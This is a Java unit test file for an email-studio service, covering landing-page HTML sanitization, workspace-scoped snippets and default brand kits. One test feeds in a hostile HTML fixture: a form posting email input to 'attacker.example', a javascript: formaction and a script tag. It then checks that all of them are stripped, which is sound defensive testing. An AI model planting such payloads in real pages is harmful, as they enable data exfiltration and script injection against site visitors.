package com.legent.content.service;

import com.legent.content.domain.LandingPage;
import com.legent.content.domain.ContentSnippet;
import com.legent.content.domain.BrandKit;
import com.legent.content.dto.EmailStudioDto;
import com.legent.content.repository.BrandKitRepository;
import com.legent.content.repository.ContentSnippetRepository;
import com.legent.content.repository.LandingPageRepository;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;

import java.time.Instant;
import java.util.List;
import java.util.Locale;
import java.util.Optional;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;

@ExtendWith(MockitoExtension.class)
class EmailStudioResourceServiceTest {

    private static final String TENANT_ID = "tenant_123";
    private static final String WORKSPACE_ID = "workspace_123";

    @Mock
    private ContentSnippetRepository snippetRepository;

    @Mock
    private BrandKitRepository brandKitRepository;

    @Mock
    private LandingPageRepository landingPageRepository;

    private EmailStudioResourceService service;

    @BeforeEach
    void setUp() {
        service = new EmailStudioResourceService(
                snippetRepository,
                brandKitRepository,
                landingPageRepository,
                new EmailContentValidationService());
    }

    @Test
    void updatePublishedLandingPageSanitizesUnsafeHtmlWhenPublishIsFalse() {
        Instant publishedAt = Instant.parse("2026-05-14T10:00:00Z");
        LandingPage landingPage = new LandingPage();
        landingPage.setId("lp_123");
        landingPage.setTenantId(TENANT_ID);
        landingPage.setWorkspaceId(WORKSPACE_ID);
        landingPage.setName("Spring Sale");
        landingPage.setSlug("spring-sale");
        landingPage.setStatus(LandingPage.Status.PUBLISHED);
        landingPage.setPublishedAt(publishedAt);
        landingPage.setHtmlContent("<h1>Safe</h1>");

        EmailStudioDto.LandingPageRequest request = new EmailStudioDto.LandingPageRequest();
        request.setName("Spring Sale");
        request.setSlug("spring-sale");
        request.setPublish(false);
        request.setHtmlContent("""
                <h1>Spring Sale</h1>
                <form action="https://attacker.example/collect">
                    <input name="email">
                    <button formaction="javascript:alert(1)">Join</button>
                </form>
                <script>alert(1)</script>
                """);

        when(landingPageRepository.findByIdAndTenantIdAndWorkspaceIdAndDeletedAtIsNull("lp_123", TENANT_ID, WORKSPACE_ID))
                .thenReturn(Optional.of(landingPage));
        when(landingPageRepository.save(any(LandingPage.class))).thenAnswer(invocation -> invocation.getArgument(0));

        LandingPage updated = service.updateLandingPage(TENANT_ID, WORKSPACE_ID, "lp_123", request);

        String html = updated.getHtmlContent().toLowerCase(Locale.ROOT);
        assertEquals(LandingPage.Status.PUBLISHED, updated.getStatus());
        assertEquals(publishedAt, updated.getPublishedAt());
        assertFalse(html.contains("<script"));
        assertFalse(html.contains("action="));
        assertFalse(html.contains("formaction"));
        assertFalse(html.contains("javascript:"));
        verify(landingPageRepository).save(landingPage);
    }

    @Test
    void createSnippetUsesWorkspaceScopeAndStoresWorkspace() {
        EmailStudioDto.SnippetRequest request = new EmailStudioDto.SnippetRequest();
        request.setSnippetKey("welcome.hero");
        request.setName("Welcome Hero");
        request.setContent("<p>Hello</p>");

        when(snippetRepository.existsByTenantIdAndWorkspaceIdAndSnippetKeyAndDeletedAtIsNull(
                TENANT_ID, WORKSPACE_ID, "welcome.hero")).thenReturn(false);
        when(snippetRepository.save(any(ContentSnippet.class))).thenAnswer(invocation -> invocation.getArgument(0));

        ContentSnippet snippet = service.createSnippet(TENANT_ID, WORKSPACE_ID, request);

        assertEquals(TENANT_ID, snippet.getTenantId());
        assertEquals(WORKSPACE_ID, snippet.getWorkspaceId());
        verify(snippetRepository).existsByTenantIdAndWorkspaceIdAndSnippetKeyAndDeletedAtIsNull(
                TENANT_ID, WORKSPACE_ID, "welcome.hero");
    }

    @Test
    void defaultBrandKitClearsOnlyCurrentWorkspaceDefaults() {
        BrandKit existingDefault = new BrandKit();
        existingDefault.setId("brand_existing");
        existingDefault.setTenantId(TENANT_ID);
        existingDefault.setWorkspaceId(WORKSPACE_ID);
        existingDefault.setName("Existing");
        existingDefault.setIsDefault(true);

        EmailStudioDto.BrandKitRequest request = new EmailStudioDto.BrandKitRequest();
        request.setName("New Default");
        request.setIsDefault(true);

        when(brandKitRepository.existsByTenantIdAndWorkspaceIdAndNameAndDeletedAtIsNull(
                TENANT_ID, WORKSPACE_ID, "New Default")).thenReturn(false);
        when(brandKitRepository.findByTenantIdAndWorkspaceIdAndDeletedAtIsNull(TENANT_ID, WORKSPACE_ID))
                .thenReturn(List.of(existingDefault));
        when(brandKitRepository.save(any(BrandKit.class))).thenAnswer(invocation -> invocation.getArgument(0));

        BrandKit created = service.createBrandKit(TENANT_ID, WORKSPACE_ID, request);

        assertEquals(WORKSPACE_ID, created.getWorkspaceId());
        assertTrue(created.getIsDefault());
        assertFalse(existingDefault.getIsDefault());
        verify(brandKitRepository).findByTenantIdAndWorkspaceIdAndDeletedAtIsNull(TENANT_ID, WORKSPACE_ID);
    }
}
